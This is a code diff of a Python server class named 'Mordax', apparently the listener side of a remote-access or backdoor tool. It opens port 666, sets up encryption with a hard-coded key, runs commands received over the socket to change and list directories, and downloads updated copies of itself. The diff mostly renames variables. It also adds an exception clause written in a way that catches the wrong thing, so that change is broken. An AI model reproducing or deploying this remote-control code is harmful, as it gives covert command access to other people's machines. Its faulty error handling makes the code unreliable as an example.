@@ -4,10 +4,11 @@ import os
 import sys
 import Crypt
 import CheckVersion
+import threading
 
 host = ""
 port = 666
-import threading
+
 
 class Mordax(Crypt.Crypt, CheckVersion.checkVersion):
 
@@ -19,16 +20,18 @@ class Mordax(Crypt.Crypt, CheckVersion.checkVersion):
         self.s.listen(3)
         self.setVersion(1.0)
         self.checkVersion()
+        self.connection, self.connected_adress = 0, 0
+        self.initialization_vector = "Init_Vektor"
         if self.checkVersion():
             self.downloadVersion("server.py")
 
     def start(self):
 
-        self.connection, self.addr = self.s.accept()
-        self.iv = self.depad(self.connection.recv(256))
-        self.KeyAndIv("mordax", self.iv)
+        self.connection, self.connected_adress = self.s.accept()
+        self.initialization_vector = self.depad(self.connection.recv(256))
+        self.KeyAndIv("mordax", self.initialization_vector)
 
-        if self.connection and self.addr:
+        if self.connection and self.connected_adress:
             connect = threading.Thread(target=self.server)
             connect.start()
             self.start()
@@ -43,8 +46,8 @@ class Mordax(Crypt.Crypt, CheckVersion.checkVersion):
                     path = data[3:]
                     try:
                         os.chdir(data[3:])
-                    except Exception:
-                        mmm = 1
+                    except socket.error, Crypt.crypto.exceptions:
+                        pass
 
                 if data[3:] == "dir":
                     os.listdir(path)
@@ -73,7 +76,6 @@ class Mordax(Crypt.Crypt, CheckVersion.checkVersion):
                 self.start()
                 self.connection, addr = self.s.accept()
                 print(addr, error)
-
 
 
 Server = Mordax()
